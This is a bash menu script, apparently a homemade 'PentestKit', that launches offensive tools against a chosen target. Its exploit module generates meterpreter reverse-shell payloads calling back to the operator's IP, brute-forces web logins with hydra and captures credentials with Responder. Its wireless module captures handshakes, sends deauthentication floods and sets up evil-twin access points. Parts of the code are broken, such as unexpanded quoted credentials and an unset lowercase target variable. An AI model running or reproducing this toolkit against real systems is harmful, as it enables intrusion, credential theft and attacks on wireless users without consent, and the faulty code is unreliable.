#!/bin/bash

GREEN='\033[0;32m'
PURPLE='\033[0;35m'
until [[ $CHOICE == "q" ]]
do
unset WCHOICE
unset RCHOICE
unset ECHOICE
unset XCHOICE
clear
echo -e " ${PURPLE} ---------------------------------------------------- "
echo 		" |     ____             __            __  __ __ _ __  |" 
echo 		" |    / __ \___  ____  / /____  _____/ /_/ //_/(_) /_ |"
echo 		" |   / /_/ / _ \/ __ \/ __/ _ \/ ___/ __/ ,<  / / __/ |"
echo 		" |  / ____/  __/ / / / /_/  __(__  ) /_/ /| |/ / /_   |"
echo 		" | /_/    \___/_/ /_/\__/\___/____/\__/_/ |_/_/\__/   |"
echo 		"  ---------------------------------------------------- "
echo 		""

echo -e		" _____________________________________________________|_._._._._._._._._._."
echo 		" \____________________________________________________|_#_#_#_#_#_#_#_#_#_|"
echo    	"                                              	      |	                    "
echo -e 	" ${GREEN}"
echo 		"  ********************[Main Menu]**********************"
echo		""
echo 		"  ---------------------------------------------------- "
echo 		" |             |                                      |"
echo 		" |      1      |         Recon Module                 |"
echo 		" |             |                                      |"
echo 		"  ---------------------------------------------------- "
echo 		"  ---------------------------------------------------- "
echo 		" |             |                                      |"
echo 		" |      2      |         Enumeration Module           |"
echo 		" |             |                                      |"
echo 		"  ---------------------------------------------------- "
echo 		"  ---------------------------------------------------- "
echo 		" |             |                                      |"
echo		" |      3      |         Exploit Module               |"
echo 		" |             |                                      |"
echo 		"  ---------------------------------------------------- "
echo 		"  ---------------------------------------------------- "
echo 		" |             |                                      |"
echo		" |      4      |         Wireless Module              |"
echo 		" |             |                                      |"
echo 		"  ---------------------------------------------------- "
echo		""
echo 		"  **************************************************** "
read -p 	"  < Please Choose Which Module To Use > " CHOICE

# RECON Module

if [ $CHOICE == 1 ]
then
	unset CHOICE
	until [[ $RCHOICE == "q" ]] 
	do
	unset RCHOICE
	clear
	echo -e " ${PURPLE} ---------------------------------------------------- "
	echo 		" |     ____                                           |"
	echo 	 	" |    / __ \___  _________  ____                      | "
	echo 	 	" |   / /_/ / _ \/ ___/ __ \/ __ \       ___o |======) |"   
	echo 	 	" |  / _, _/  __/ /__/ /_/ / / / /      /\  \/   /\    |"
	echo 	 	" | /_/ |_|\___/\___/\____/_/ /_/      / /      /  \   |"
	echo 	 	" |                                                    |"
	echo 	 	"  ---------------------------------------------------- "
	echo		""
	echo -e " ${GREEN} ---------------------------------------------------- "
	echo 		" |             |                                      |"
	echo 		" |      1      |            Enter Target              |"
	echo 		" |             |                                      |"
	echo 		"  ---------------------------------------------------- "
	echo 		"  ---------------------------------------------------- "
	echo 		" |             |                                      |"
	echo 		" |      2      |            Basic Scan                |"
	echo 		" |             |                                      |"
	echo 		"  ---------------------------------------------------- "
	echo 		"  ---------------------------------------------------- "
	echo 		" |             |                                      |"
	echo 		" |      3      |            Advanced Scan             |"
	echo 		" |             |                                      |"
	echo 		"  ---------------------------------------------------- "
	echo		""
	echo		"  *************************" 
	echo		"  <  TARGET = $TARGET  >"
	echo		"  *************************"
	read -p 	"  < Please Enter Your Choice > " RCHOICE

	if [ $RCHOICE == 1 ]
	then
		clear
		echo	""
                echo -e "${PURPLE}  			          ___     "
                echo		"	    		        /\ _ /\   "
		echo		"	    >>>----            / /\ /\ \  "
		echo		"	  >>>----             |---(*)---| "
                echo		"	 		       \ \/_\/ /  "
	        echo		"	 	   >>>----      \/___\/   "
		echo		""
		echo -e	 " ${GREEN}********************************************* "
		read -p 	" < Enter The Target IP Address > " TARGET
		echo $TARGET
	fi

	if [ $RCHOICE == 2 ]
	then
		if ping -c1 $TARGET | grep "64" > /dev/null 
		then
			echo " ******************************************************* "
			read -p " < Would You Like To Write The Outputs Files? [y/n] > " W2F
			if [ $W2F == "y" ]
			then
				clear
				echo -e " ${PURPLE}**************************************"
				echo		" *    	    Scanning Target...         *"
				echo		" *	    Please Be Patient	       *"
				echo		" **************************************"
				nmap -sS -sV -A $TARGET -oN ~/Recon/nmapscan
				echo -e " ${GREEN}**************************************"
				echo		" *          Scan Complete :)          *"
				echo		" **************************************"
				echo	""					
				echo	" ****************************************************** "
				read -p " < Enter [q] To Go Back Or Any Key To Restart Scan > " QCHOICE
			fi
			if [ $W2F == "n" ]
			then
				clear
				echo -e " ${PURPLE}**************************************"
				echo		" *    	    Scanning Target...         *"
				echo		" *	    Please Be Patient	       *"
				echo		" **************************************"
				nmap -sS -sV -A -vvv $TARGET
				echo -e " ${GREEN}**************************************"
				echo		" *          Scan Complete :)          *"
				echo		" **************************************"
				echo	""					
				echo	" ****************************************************** "
				read -p " < Press Enter Key To Exit > " QUIT
			fi
		fi
	fi

	if [ $RCHOICE == 3 ]
	then
		if ping -c1 $TARGET | grep "64" > /dev/null
		then
			echo " ******************************************************* "
			read -p " < Would You Like To Write The Outputs Files? [y/n] > " W2F			
			if [ $W2F == "y" ]
			then
				clear	
				echo -e " ${PURPLE}**************************************"
				echo		" *    	    Scanning Target...         *"
				echo		" *	    Please Be Patient	       *"
				echo		" **************************************"		
				nmap -sS -sV -A $TARGET -oN ~/Recon/nmapscan
				echo -e " ${GREEN}**************************************"
				echo		" *          Scan Complete :)          *"
				echo		" **************************************"	
				if cat ~/Recon/nmapscan | grep Windows
				then
					echo -e " ${PURPLE}**************************************"
					echo		" * Scanning The Windows Environment...*"
					echo		" *	   Please Be Patient	       *"
					echo		" **************************************"
					echo		" *     Collecting Information...      *"
					echo		" **************************************"			
					enum4linux $TARGET > ~/Recon/ADenum
					echo -e " ${GREEN}**************************************"
					echo		" *          Scan Complete :)          *"
					echo		" **************************************"
				fi
				if cat ~/Recon/nmapscan | grep 80/tcp
				then
					echo	""
					echo -e " ${PURPLE}****************************************"
					echo		" * Performing A Web Directory Bruteforce *"
					echo		" *	     Please Be Patient	          *"
					echo		" *****************************************"
					echo	""
					dirb http://$TARGET -o ~/Recon/dirbscan
					echo -e " ${GREEN}*****************************************"
					echo		" *    Directory Bruteforce Complete :)   *"
					echo		" *****************************************"
					echo	""
					echo -e " ${PURPLE}****************************************"
					echo	" * Running Website Vulnerability Scan... *"
					echo	" *	     Please Be Patient	          *"
					echo	" *****************************************"
					echo	""
					nikto -h $TARGET -o webvulnscan.txt
					echo -e " ${GREEN}**************************************"
					echo	" *          Scan Complete :)          *"
					echo	" **************************************"			
				fi
				if cat ~/Recon/nmapscan | grep 21/tcp
				then
					nmap --script=ftp-anon $TARGET -oN ~/Recon/ftpanon
					cat ~/Recon/ftpanon
					echo -e " ${PURPLE}**************************************"
					echo		" *    Scanning For Possible CVEs...   *"
					echo		" *	   Please Be Patient	       *"
					echo		" **************************************"
					nmap --script=vuln -vvv $TARGET -oN ~/Recon/vulnscan
					cat ~/Recon/vulnscan
					echo -e " ${GREEN}**************************************"
					echo		" *          Scan Complete :)          *"
					echo		" **************************************"
				fi
				echo	""					
				echo	" ****************************************************** "
				read -p " < Press The Enter Key To Exit > " QCHOICE
			fi					
			if [ $W2F == "n" ]
			then	
					clear	
					echo -e " ${PURPLE}**************************************"
					echo		" *    	    Scanning Target...         *"
					echo		" *	    Please Be Patient	       *"
					echo		" **************************************"
					nmap -sS -sV -A -vvv $TARGET -oN scan
					cat scan
					echo -e " ${GREEN}**************************************"
					echo		" *          Scan Complete :)          *"
					echo		" **************************************"
					if cat scan | grep Windows
					then
						echo -e " ${PURPLE}**************************************"
						echo	" * Scanning The Windows Environment...*"
						echo	" *	   Please Be Patient	       *"
						echo	" **************************************"
						echo	" *     Collecting Information...      *"
						echo	" **************************************"
						enum4linux $TARGET 
						echo -e " ${GREEN}**************************************"
						echo	" *          Scan Complete :)          *"
						echo	" **************************************"
					fi
					if cat scan | grep 80/tcp
					then
						echo -e " ${PURPLE}****************************************"
						echo	" * Performing A Web Directory Bruteforce *"
						echo	" *	     Please Be Patient	          *"
						echo	" *****************************************"
						dirb http://$TARGET 	
						echo -e " ${GREEN}*****************************************"
						echo	" *    Directory Bruteforce Complete :)   *"
						echo	" *****************************************"
						echo	""
						echo -e " ${PURPLE}****************************************"
						echo	" * Running Website Vulnerability Scan... *"
						echo	" *	     Please Be Patient	          *"
						echo	" *****************************************"
						echo	""
						nikto -h $TARGET
						echo -e " ${GREEN}**************************************"
						echo	" *          Scan Complete :)          *"
						echo	" **************************************"
					fi
					if cat scan | grep 21/tcp
					then
						echo -e " ${PURPLE}********************************************"
						echo	" *    Scanning For Anonymous FTP Login      *"
						echo	" *          And Vulnerable Services	     *"					
						echo	" *	        Please Be Patient            *"							
						echo	" ********************************************"	
						nmap --script=ftp-anon -vvv $TARGET
						nmap --script=vuln -vvv $TARGET
						echo -e " ${GREEN}********************************************"
						echo	" *              Scan Complete :)            *"
						echo	" ********************************************"
						echo	""				
						echo	" ****************************************************** "
					fi
					rm 	scan
					read -p " < Press Enter To Exit > " QUIT
			fi	
		fi
	fi
	done
fi

#ENUMERATION Module

if [ $CHOICE == 2 ]
then

	until [[ $ECHOICE == "q" ]] 
	do
	unset CHOICE
	unset ECHOICE
	clear
	echo -e " ${PURPLE} --------------------------------------------------------------------------------------------- "
		echo -e " |     ______                                      __  _                                       | "
	   	echo -e " |    / ____/___  __  ______ ___  ___  _________ _/ /_(_)___  ____               |   _   _     | "
	  	echo -e " |   / __/ / __ \/ / / / __  __ \/ _ \/ ___/ __ \/ __/ / __ \/ __ \        . | . x .|.|-|.|    | "
	 	echo -e " |  / /___/ / / / /_/ / / / / / /  __/ /  / /_/ / /_/ / /_/ / / / /     |\ ./.\-/.\-|.|.|.|    | "
		echo -e " | /_____/_/ /_/\__,_/_/ /_/ /_/\___/_/   \__,_/\__/_/\____/_/ /_/   ~~~|.|_|.|_|.|.|.|_|.|~~~ | "
		echo -e " |                                                                                             |"
	        echo	"  --------------------------------------------------------------------------------------------- "                                                        	
		echo	""
		echo -e " ${GREEN} --------------------------------------------------------------------------------------------- "
		echo 	" |             |                                                                               |"
		echo 	" |      1      |                                Enter Target                                   |"
		echo 	" |             |                                                                               |"
		echo 	"  --------------------------------------------------------------------------------------------- "
		echo 	"  --------------------------------------------------------------------------------------------- "
		echo 	" |             |                                                                               |"
		echo 	" |      2      |                                 SMB Login                                     |"
		echo 	" |             |                                                                               |"
		echo 	"  --------------------------------------------------------------------------------------------- "
		echo 	"  --------------------------------------------------------------------------------------------- "
		echo 	" |             |                                                                               |"
		echo 	" |      3      |                                 FTP Login                                     |"
		echo 	" |             |                                                                               |"
		echo 	"  --------------------------------------------------------------------------------------------- "
		echo 	"  --------------------------------------------------------------------------------------------- "
		echo 	" |             |                                                                               |"
		echo 	" |      4      |                             Enumeration Scripts                               |"
		echo 	" |             |                                                                               |"
		echo 	"  --------------------------------------------------------------------------------------------- "
		echo	""
		echo	"  *****************************" 
		echo	"  <  TARGET = $TARGET  >"
		echo	"  *****************************"
		read -p "  < Please Enter Your Choice > " ECHOICE
	
	if [ $ECHOICE == 1 ]
	then
		clear
		echo	""
                echo -e "${PURPLE}  			          ___     "
                echo		"	    		        /\ _ /\   "
		echo		"	    >>>----            / /\ /\ \  "
		echo		"	  >>>----             |---(*)---| "
                echo		"	 		       \ \/_\/ /  "
	        echo		"	 	   >>>----      \/___\/   "
		echo		""
		echo -e	 " ${GREEN}********************************************* "
		read -p 	" < Enter The Target IP Address > " TARGET
		echo $TARGET
	fi
	if [ $ECHOICE == 2 ]
	then	
		read -p " < Do You Have User Credentials? [y/n] > " CREDCHOICE
		if [ $CREDCHOICE == "y" ]
		then
			echo	" ************************************"
			read -p " < Please Enter The Username > " USER
			echo	" ************************************"
			echo	""
			echo	" ************************************"
			read -p " < Please Enter The Password > " PASS
			echo	" ************************************"
			clear
			echo -e " ${PURPLE}***************************************"
			echo		" *       Connecting to Target...       *"
			echo		" ***************************************"
			smbclient -L $TARGET -U '$USER%$PASS'
			echo	""
			echo -e " ${GREEN}************************************************ "
			read -p " < Please Enter The Share To Connect To > " SHARE
			echo	" ************************************************ "
			echo	""
			echo	" ************************************************"
			echo	" *        Enter 'exit' To Return To Menu        *"
			echo	" ************************************************"
			smbclient //$TARGET/$SHARE -U '$USER%$PASS' 
		fi
		if [ $CREDCHOICE == "n" ]
		then
			clear
			echo -e " ${PURPLE}***************************************"
			echo	" *       Connecting to Target...       *"
			echo	" ***************************************"
			echo	""
			smbclient -L $TARGET 
			echo	""
			echo -e " ${GREEN}************************************************ "
			read -p " < Please Enter The Share To Connect To > " SHARE
			echo	" ************************************************ "
			echo	""
			echo	" ************************************************"
			echo	" *        Enter 'exit' To Return To Menu        *"
			echo	" ************************************************"
			smbclient //$TARGET/$SHARE  
		fi		
	fi
	if [ $ECHOICE == 3 ]
	then
		clear
		echo -e " ${PURPLE}***************************************"
		echo	" *       Connecting to Target...       *"
		echo	" ***************************************"
		echo	""
		echo -e " ${GREEN}************************************************ "
		echo	" *        Enter 'exit' To Return To Menu        *"
		echo	" ************************************************" 
		ftp $target
	fi
	if [ $ECHOICE == 4 ]
	then
		ESCRIPT=`ls -l ~/Enum/Scripts/`
		IP=`ip -4 addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'`
		read -p " < Please Enter How Many Seconds You Would Like The Web Server Up For > " TOUT
		clear
		cd ~/Enum/Scripts/
		echo -e " ${GREEN}***********************************************************************"
		echo 	" *< Web Server Spawned On http://$IP/ To Download Enum Scripts From. > *"
		echo 	" *              < Here Is A List Of Scripts Available >                *"
		echo 	" ***********************************************************************"
		echo	""
		echo 	"                             $ESCRIPT                                   "
		echo	""
		echo	" ***********************************************************************"		
		timeout $TOUT python -m SimpleHTTPServer 80
	fi
	done
fi

#EXPLOIT Module

if [ $CHOICE == 3 ]
then

	until [[ $XCHOICE == "q" ]] 
	do
	unset CHOICE
	unset XCHOICE
	clear
	echo -e " ${PURPLE} ----------------------------------------------------- "
	echo		" |                                        ,  /\  .     |"
	echo    	" |       ______           __      _ __    / -||- \\     |"
	echo 	 	" |      / ____/  ______  / /___  (_) /_ (| -=||=- |)   |"
	echo -e	 	" |     / __/ | |/_/ __ \/ / __ \/ / __/   \\ -||- /     |"   
	echo    	" |    / /____>  </ /_/ / / /_/ / / /_        ||        |"
	echo    	" |   /_____/_/|_/ .___/_/\____/_/\__/        ||        |"
	echo    	" |             /_/                           ||        |"
	echo		" |                                           ()        |"
	echo 	 	"  ----------------------------------------------------- "
	echo		""
	echo -e " ${GREEN} ----------------------------------------------------- "
	echo 		" |             |                                       |"
	echo 		" |      1      |            Enter Target               |"
	echo 		" |             |                                       |"
	echo 		"  ----------------------------------------------------- "
	echo 		"  ----------------------------------------------------- "
	echo 		" |             |                                       |"
	echo 		" |      2      |          Payload Generator            |"
	echo 		" |             |                                       |"
	echo 		"  ----------------------------------------------------- "
	echo 		"  ----------------------------------------------------- "
	echo 		" |             |                                       |"
	echo 		" |      3      |              CVE Search               |"
	echo 		" |             |                                       |"
	echo 		"  ----------------------------------------------------- "
	echo 		"  ----------------------------------------------------- "
	echo 		" |             |                                       |"
	echo 		" |      4      |         Web Login Bruteforce          |"
	echo 		" |             |                                       |"
	echo 		"  ----------------------------------------------------- "
	echo 		"  ----------------------------------------------------- "
	echo 		" |             |                                       |"
	echo 		" |      5      |          Evil WinRm Login             |"
	echo 		" |             |                                       |"
	echo 		"  ----------------------------------------------------- "
	echo 		"  ----------------------------------------------------- "
	echo 		" |             |                                       |"
	echo 		" |      6      |             msfconsole                |"
	echo 		" |             |                                       |"
	echo 		"  ----------------------------------------------------- "
	echo 		"  ----------------------------------------------------- "
	echo 		" |             |                                       |"
	echo 		" |      7      |       Responder Creds Capture         |"
	echo 		" |             |                                       |"
	echo 		"  ----------------------------------------------------- "
	echo		""
	echo		"  *************************" 
	echo		"  <  TARGET = $TARGET  >"
	echo		"  *************************"
	read -p 	"  < Please Enter Your Choice > " XCHOICE

	if [ $XCHOICE == 1 ]
	then
		clear
		echo	""
                echo -e "${PURPLE}  			          ___     "
                echo		"	    		        /\ _ /\   "
		echo		"	    >>>----            / /\ /\ \  "
		echo		"	  >>>----             |---(*)---| "
                echo		"	 		       \ \/_\/ /  "
	        echo		"	 	   >>>----      \/___\/   "
		echo		""
		echo -e	 " ${GREEN}********************************************* "
		read -p 	" < Enter The Target IP Address > " TARGET
	fi

	if [ $XCHOICE == 2 ]
	then	
		clear
		echo	" ******************"
		echo	" * < 1. Windows > *"
		echo	" *  < 2. Linux >  *"
		echo	" ******************"
		read -p " < Please Enter Target OS [1/2] > " OS
		if [ $OS == 1 ]
		then
			ifconfig
			echo	""
			echo	" **********************************************"
			read -p " < Please Enter Which Network Adapter To Use > " NETAD
			IP=`ip -4 addr show $NETAD | grep -oP '(?<=inet\s)\d+(\.\d+){3}'`
			echo	" **********************************************************"
			read -p " < Please Enter The Port Number To Communicate On > " PNUM
			echo	" **********************************************************"
			read -p " < Please Enter The Format Of The Payload e.g. elf,exe > " FORM
			echo	" **********************************************************************************"
			read -p " < Please Enter The Filename With Path For The Payload To Be Written To > " FNAME
			echo	" **********************************************************************************"
			msfvenom -p windows/meterpreter/reverse_tcp --platform Windows LHOST=$IP LPORT=$PNUM -f $FORM > $FNAME
			read -p " < Press Any Key To Exit > " EXIT	
		fi
		if [ $OS == 2 ]
		then
			echo	""
			ifconfig
			echo	""
			echo	" **********************************************"
			read -p " < Please Enter Which Network Adapter To Use > " NETAD
			IP=`ip -4 addr show $NETAD | grep -oP '(?<=inet\s)\d+(\.\d+){3}'`
			echo	" **********************************************************"
			read -p " < Please Enter The Port Number To Communicate On > " PNUM
			echo	" **********************************************************"
			read -p " < Please Enter The Format Of The Payload e.g. raw,bash > " FORM
			echo	" **********************************************************************************"
			read -p " < Please Enter The Filename With Path For The Payload To Be Written To > " FNAME
			echo	" **********************************************************************************"
			msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$IP LPORT=$PNUM -f $FORM > $FNAME
			read -p " < Press Any Key To Exit > " EXIT	
		fi
	fi
	
	if [ $XCHOICE == 3 ]
	then
		echo	" **********************************************"
		read -p " < Please Enter The Target Software > " SOFT
		echo	" **********************************************"
		searchsploit $SOFT
		read -p " < Press Enter To Exit > " EXIT
	fi

	if [ $XCHOICE == 4 ]
	then	
		clear
		echo	" ************************************************"
		read -p " < Please Enter The Target Web Page > " WEBTARG
		echo	" ************************************************"
		read -p " < Please Enter The Username > " USER
		echo	" ************************************************"
		read -p " < Please Enter The Password List > " PASSLIST
		echo	" ************************************************"
		echo    " < EXAMPLE (http-post-form “/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login Failed”) > "
		read -p " < Please Enter The Request Body >" RBOD
		echo	" ************************************************"
		echo	""
		hydra -P $PASSLIST $WEBTARG $RBOD
		echo	""
		read -p " < Press Enter To Exit > " EXIT	
	fi
	
	if [ $XCHOICE == 5 ]
	then
		clear
		echo	" ***********************************************"
		read -p " < Please Enter The Username > " USERRM
		echo	" ***********************************************"
		read -p " < Please Enter The Password > " PASSRM
		echo	" ***********************************************"
		echo	""
		ruby /root/Apps/evil-winrm/evil-winrm.rb -i $TARGET -u $USERRM -p $PASSRM
		echo 	""
		read -p " < Press Enter To Exit > " EXIT
	fi

	if [ $XCHOICE == 6 ]
	then
		clear
		echo	" *******************************************"
		echo	" *    Type 'exit' To Leave The Console     *"
		echo	" *******************************************"
		echo	""
		msfdb run
	fi	
	if [ $XCHOICE == 7 ]
	then
		clear
		echo	" ********************************************************************"
		read -p " < Please Enter How Many Seconds You'd Like Responder To Run For > " TTL
		echo	" ********************************************************************"
		echo	""
		timeout $TTL responder -I eth0 -wrfv
	fi
	done
fi	
	

#WIRELESS Module

if [ $CHOICE == 4 ]
then
	until [[ $WCHOICE == "q" ]]
	do
	clear
	unset CHOICE
	unset WCHOICE
	unset NETAD
	echo -e	" ${PURPLE} ------------------------------------------------------------------------"	
	echo -e	" |	                                          (;;;)                   |"
	echo -e	" |	                                           \_|                    |"
	echo -e " |	                                              \ _.--l--._         |"
	echo -e " |	                                             . \    |     '.      |"
	echo -e " |                                       	   .' '.\   |    .' '.    |"
	echo -e " |  _       ___           __                     .'     '\  |  .'     '.  |"
	echo -e " | | |     / (_)_______  / /__  __________	/ __      \.|.'      __ \ |"
	echo -e " | | | /| / / / ___/ _ \/ / _ \/ ___/ ___/	|   ''--._ \V  _.--''   | |"
	echo -e " | | |/ |/ / / /  /  __/ /  __(__  |__  ) 	|        _ (*) _        | |"
	echo -e " | |__/|__/_/_/   \___/_/\___/____/____/	| __..--'   ^   '--..__ | |"
	echo -e " |                                              \         .'|'.         / |"
	echo -e " |					         '.     .'  |  '.     .'  |"
	echo -e " |	   				           '. .'    |    '. .'    |"
	echo -e " |	     				             '._    |    _.'      |"
	echo -e " |	         				         '--l--'          |"
	echo	"  ------------------------------------------------------------------------"
	echo	
	echo -e " ${GREEN} ----------------------------------------------------- "
	echo	" |             |                                       |"
	echo	" |      1      |        Switch To Monitor Mode         |"
	echo	" |             |                                       |"
	echo	"  ----------------------------------------------------- "
	echo	"  ----------------------------------------------------- "
	echo	" |             |                                       |"
	echo	" |      2      |            Scan For APs               |"
	echo	" |             |                                       |"
	echo	"  ----------------------------------------------------- "
	echo	"  ----------------------------------------------------- "
	echo	" |             |                                       |"
	echo	" |      3      |          Capture Handshakes           |"
	echo	" |             |                                       |"
	echo	"  ----------------------------------------------------- "
	echo	"  ----------------------------------------------------- "
	echo	" |             |                                       |"
	echo	" |      4      |              Bettercap                |"
	echo	" |             |                                       |"
	echo	"  ----------------------------------------------------- "
	echo	"  ----------------------------------------------------- "
	echo	" |             |                                       |"
	echo	" |      5      |          Rogue Access Point           |"
	echo	" |             |                                       |"
	echo	"  ----------------------------------------------------- "
	echo	
	echo	" *******************************************************"
	read -p " < Please Enter Your Choice > " WCHOICE
	
	if [ $WCHOICE == 1 ]
	then
		clear
		airmon-ng
		echo
		echo -e " ${GREEN}*****************************************************"
		read -p " < Please Enter Which Network Adapter To Use > " NETAD
		echo	" *****************************************************"
		airmon-ng start $NETAD
		echo
		echo	" *****************************************************"
		read -p " < Please Press Enter To Exit > " QUIT
	fi

	if [ $WCHOICE == 2 ]
	then
		clear
		echo		
		airmon-ng
		echo
		echo -e " ${GREEN}****************************************************"
		read -p " < Please Enter Which Network Adapter To Use > " NETAD
		echo	" ****************************************************"
		read -p " < Press Enter To Start Scan And Ctrl-C To End Scan > " SCAN
		echo	" ****************************************************"
		echo	" *                   Starting Scan...               *"
		echo	" *	       Writing To ~/Recon/APscan.txt         *"
		echo	" ****************************************************"
		sleep 2
		airodump-ng $NETAD --output-format csv -w ~/Recon/APscan 
		echo
		echo	" ****************************************************"
		read -p " < Please Press Enter To Exit > " QUIT
	fi
	if [ $WCHOICE == 3 ]
	then	
		FILE='~/Recon/APscan-01.csv'
		read -p " < Would You Like To Capture Handshakes Actively [1] Or Passively [2] > " ACPA
		if [ $ACPA == 1 ]
		then
        	       	echo            
        	       	airmon-ng
        	       	echo
        	       	echo    " ${GREEN}****************************************************"
       		        read -p " < Please Enter Which Network Adapter To Use > " NETAD
        	       	echo    " ****************************************************"
        	        echo    " *                   Starting Scan...               *"
       		        echo    " *                 Writing To ~/Recon/              *"
        	       	echo    " ****************************************************"
			sleep 2
       		        airodump-ng $NETAD --output-format csv -w ~/Recon/APscancsv 
        	       	echo
			echo	" ****************************************************" 
        	        read -p " < Please Enter The Target AP's BSSID > " BSSID
			echo
			airodump-ng $NETAD -f 30000 -w ~/Wireless/Capture/capture &
			aireplay-ng -O 10 -a $BSSID $NETAD &
			zizzania -i $NETAD -b $BSSID
			echo    " ****************************************************"
       	        	read -p " < Please Press Enter To Exit > " QUIT
		fi
		if [ $ACPA == 2 ]
		then
        	       	echo            
        	       	airmon-ng
        	       	echo
        	       	echo    " ****************************************************"
       		        read -p " < Please Enter Which Network Adapter To Use > " NETAD
        	       	echo    " ****************************************************"
        	        echo    " *                   Starting Scan...               *"
       		        echo    " *            Writing To ~/Recon/APscan.txt         *"
        	       	echo    " ****************************************************"
			sleep 2
       		        airodump-ng $NETAD --output-format csv -w ~/Recon/APscancsv 
        	       	echo
        	        read -p " < Please Enter The Target BSSID > " BSSID
        	        BSSID=`cat $FILE | awk '/$APTARG/ {print $1}'`
			airodump-ng $NETAD -f 30000 -w ~/Wireless/Capture/capture &
			zizzania -i $NETAD -b $BSSID
			echo    " ****************************************************"
       	        	read -p " < Please Press Enter To Exit > " QUIT
		fi	
	fi
	if [ $WCHOICE == 4 ]
	then
		clear
		airmon-ng start wlan0
		echo
		echo	" ************************************"
		echo	" *       Launching  Bettercap!      *"
		echo	" ************************************"
		bettercap -iface eth0 -autostart net.sniff net.recon
		read -p " < Please Press The Enter Key To Exit > " QUIT
	fi
	if [ $WCHOICE == 5 ]
	then
		clear
		echo	" *************************************************************************"
		read -p " < Would You Like To Create Your Own Rogue AP [1] Or an Evil Twin [2] > " RAPCHOICE
		echo	" *************************************************************************"
		if [ $RAPCHOICE == 1 ]
		then	
			echo
			airmon-ng
			echo	
			echo	" ******************************************************"
			read -p " < Please Choose Which Network Adapter To Use > " NETAD
			echo	" ******************************************************"
			echo
			airmon-ng start $NETAD 
			echo
			echo	" **********************************************************"
			read -p " < Please Enter The Name You Want For the AP > " APNAME
			echo	" **********************************************************"
			echo
			echo	" **********************************************************"
			read -p " < Please Enter The Channel To Run The AP On [1-11] > " CHANCHOICE
			echo	" **********************************************************"
			echo
			airbase-ng --essid $APNAME -c $CHANCHOICE $NETAD
			echo
			echo	" ******************************"
			read -p " < Please Press Enter To Exit > " QUIT
		fi
		if [ $RAPCHOICE == 2 ]
		then
			read -p " < Please Choose Whether To Attack Actively [1] Or Passively [2] > " PASACHOICE
			if [ $PASACHOICE == 1 ]
			then
				echo
				airmon-ng
				echo	" ******************************************************" 
				read -p " < Please Choose Which Network Adapter To Use > " NETAD
				echo	" ******************************************************" 
				echo
				airodump-ng $NETAD
				echo
				echo	" ******************************************************" 
				read -p " < Please Enter The Name Of The Target AP > " APNAME
				echo	" ******************************************************"
				echo
				echo	" ******************************************************"  
				read -p " < Please Enter The BSSID Of The Target AP > " BSSID
				echo	" ******************************************************" 
				echo
				echo	" ******************************************************" 
				read -p " < Please Enter The Channel Of The Target AP > " TARGCHAN
				echo	" ******************************************************" 
				echo
				aireplay-ng --deauth -O 10 -a $BSSID $NETAD &
				airbase-ng -a $BSSID --essid $APNAME -c $TARGCHAN $NETAD
				echo
				echo	" ******************************"
				read -p " < Please Press Enter To Exit > " QUIT
			fi
		fi
	fi
	done
fi
done
